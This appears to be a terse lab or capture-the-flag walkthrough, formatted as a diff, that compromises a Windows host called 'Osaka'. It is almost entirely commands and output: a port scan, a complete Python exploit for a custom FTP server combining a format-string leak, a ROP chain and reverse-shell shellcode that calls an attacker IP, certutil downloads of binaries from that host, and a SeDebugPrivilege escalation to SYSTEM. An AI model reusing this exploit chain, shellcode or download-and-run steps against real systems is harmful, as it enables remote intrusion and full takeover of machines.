@@ -1,0 +1,195 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.218.20 > Osaka.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|_    220 Welcome to Simple FTP Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-07-03T03:01:40+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=osaka
+| Issuer: commonName=osaka
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-07-02T02:45:24
+| Not valid after:  2027-01-01T02:45:24
+| MD5:     09b2 7cdd 46a8 9794 029a ea91 c229 502a
+| SHA-1:   b412 7809 775d 9aed 8ac4 bfaa c713 4994 c011 be1c
+|_SHA-256: 80b7 3e82 fbf8 38ec 3864 d577 d346 4b2e 5c75 0ee2 a58a cabe c34f 5fd2 b26b 714d
+| rdp-ntlm-info: 
+|   Target_Name: OSAKA
+|   NetBIOS_Domain_Name: OSAKA
+|   NetBIOS_Computer_Name: OSAKA
+|   DNS_Domain_Name: osaka
+|   DNS_Computer_Name: osaka
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-07-03T03:01:29+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: Simple; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-07-03T03:01:33
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+$ ftp 192.168.218.20
+Try cred ftp:ftp
+Directory of C:\dev
+
+05/11/2023  01:03 PM    <DIR>          .
+05/11/2023  01:03 PM    <DIR>          ..
+05/11/2023  12:25 PM                29 dev.txt
+05/11/2023  12:16 PM           158,208 ftp.exe
+
+$ cat osaka.py 
+from pwn import *
+# msfvenom -a x86 -platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.194 LPORT=443 -f python -v sc
+sc =  b""
+sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
+sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
+sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
+sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
+sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
+sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
+sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
+sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
+sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
+sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
+sc += b"\x2d\xc2\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
+sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
+sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
+sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
+sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
+sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
+sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
+sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
+# Login
+p = remote('192.168.218.20', 21, level='debug')
+p.recvuntil("220 Welcome to Simple FTP Server")
+p.sendline("USER admin")
+p.recvuntil("331 User OK, password required")
+p.sendline("PASS admin")
+p.recvuntil("230 Login successful")
+
+# Leak Base Address for ROP
+p.sendline(b"DEBUG " + b"%x|" * 100)
+leak = p.recvlines(numlines=2)[-1][6:]
+leak = leak.split(b"|")
+leak_pie = int(leak[0], 16)
+leak_ntdll = int(leak[4], 16)
+
+bin_base = leak_pie - 0x10f0
+print(f"Binary Base:   {hex(bin_base)}")
+
+total = 1000
+
+rop_gadgets = [
+    # Setting up the registers for VirtualAlloc
+    0xe145 + bin_base,  # POP EBP # RETN
+    0xe145 + bin_base,  # Skip 4 bytes
+    0x1d5a9 + bin_base, # POP EBX # RETN
+    0x1,                # EBX = 1
+    0x1bd7e + bin_base, # POP EDX # RETN
+    0x1000,             # EDX = 0x1000 (size)
+    0x11a2b + bin_base, # POP ECX # RETN
+    0x40,               # ECX = 0x40 (executable permissions)
+    0x4667 + bin_base,  # POP EDI # RETN
+    0x4682 + bin_base,  # RETN (ROP NOP)
+    0x1dff + bin_base,  # POP ESI # RETN
+    0x14adb + bin_base, # JMP [EAX]
+    0x1d2bf + bin_base, # POP EAX # RETN
+    0x1e008 + bin_base, # Pointer to VirtualAlloc()
+    0x10d6 + bin_base,  # PUSHAD # RETN
+    0x10da + bin_base,  # JMP ESP
+]
+
+rop = b""
+for gadget in rop_gadgets:
+    rop += p32(gadget)
+
+print("Press any key to send")
+input()
+
+buf = b""
+buf += b"A" * (268 + 4)
+buf += rop
+buf += b"\x90" * 10  # NOP sled
+buf += sc
+buf += b"B" * (total - len(buf))
+p.sendline(b"RETR " + buf + b"\r\n")
+$ python osaka.py
+
+$ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.45.194] from (UNKNOWN) [192.168.218.20] 49934
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\dev>whoami
+osaka\wilson
+C:\dev>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                                   State   
+=============================== ============================================= ========
+SeLoadDriverPrivilege           Load and unload device drivers                Disabled
+SeDebugPrivilege                Debug programs                                Enabled 
+SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled 
+SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set                Disabled
+
+# https://github.com/r4j3sh-com/SeDebugPrivilegePoC
+PS C:\osaka> certutil.exe -split -f -urlcache "http://192.168.45.194/SeDebugPrivilegePoC.exe"
+PS C:\osaka> certutil.exe -split -f -urlcache "http://192.168.45.194/sh4444.exe"
+PS C:\osaka> .\SeDebugPrivilegePoC.exe sh4444.exe
+.\SeDebugPrivilegePoC.exe sh4444.exe
+[*] Modified by r4j3sh
+[*] Executing command: sh4444.exe
+[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
+[*] This PoC tries to Execute the command as a winlogon.exe's child process.
+[>] Searching winlogon PID.
+[+] PID of winlogon: 552
+[>] Trying to get handle to winlogon.
+[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2DC).
+[+] New process is created successfully.
+    |-> PID : 4292
+    |-> TID : 3868
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.194] from (UNKNOWN) [192.168.218.20] 50083
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\osaka>whoami
+whoami
+nt authority\system
+
